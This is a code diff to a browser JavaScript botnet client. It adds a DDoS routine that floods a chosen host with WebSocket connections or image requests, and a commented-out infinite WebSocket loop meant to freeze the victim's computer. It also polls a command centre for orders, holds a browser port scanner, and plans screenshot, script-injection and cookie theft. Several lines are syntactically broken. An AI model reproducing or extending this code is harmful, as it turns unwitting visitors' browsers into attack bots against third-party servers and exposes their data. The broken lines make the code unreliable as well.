@@ -27,10 +27,30 @@
 
     // DDOS function
     function dos (options) {
-        for(var i = 0; i < options.numRequests; i++){
-            var img = new Image();
-            var url = options.prot + '://' + options.ip + ':' + options.port + '/?' + i; // i is there to prevernt cauche seeking
-            img.src = url;
+
+        if(options.prot starts with "ws"){
+            // browser high limit on simultanius web socket connections around 6000.. dependant on browser
+            var wss = new Array();
+
+            for(var i =0; i < options.numRequests; i++) {
+
+                var target = options.prot + '://' + options.host + ':' + options.port + '/?' + i;
+
+                if ("WebSocket" in window) ws[i] = new WebSocket(target);
+                else if ("MozWebSocket" in window)  ws[i] = new MozWebSocket(target);
+                else return false;
+
+            }
+            return true;
+
+        }else{
+
+            for(var i = 0; i < options.numRequests; i++){
+                var img = new Image();
+                var url = options.prot + '://' + options.host + ':' + options.port + '/?' + i; // i is there to prevernt cauche seeking
+                img.src = url;
+            }
+            return true;
         }
     }
 
@@ -103,7 +123,7 @@
 
     };
 
-    // scan an ip and port to see if open
+    // scan an host and port to see if open
     function isPortUp(options,cb){
         var img = new Image(),
             timeout = 100;
@@ -135,6 +155,14 @@
     // screenshots
     // inject js
     // request commands
+    // send Dom
+    // cookies
+
+    // this overloads the browser with generating infinite web sockets
+    function killClient(){
+        // dont run .... will freeze computer
+        //        while(1){new WebSocket("ws://localhost");}
+    }
     function requestCommands(botId){
         console.log(botId);
         //            var command = httpGet(config.cCenter + botId)
@@ -146,11 +174,34 @@
         xmlHttp.send( null );
         return xmlHttp.responseText;
     }
+    function httpPost(theUrl,res){
+        var xmlHttp = new XMLHttpRequest();
+        xmlHttp.open( "GET", theUrl, false );
+        xmlHttp.send( null );
+        return xmlHttp.responseText;
+    }
 
     function execCommands(comms){
         console.log("commands: ", comms);
-        //dos({ prot: 'http', ip : 'localhost', port: 80 });
+        //dos({ prot: 'http', host : 'localhost', port: 80 });
+
         //    switch  case for each type of commands
+        //        switch(expression) {
+        //            case n:
+        //                code block
+        //                break;
+        //            case n:
+        //                code block
+        //                break;
+        //            default:
+        //                code block
+        //        }
+    }
+    function sendResults(results){
+        var res = {
+            botId = window.greyKnights,
+        };
+        httpPost(url,res)
     }
 
     function finCode(){
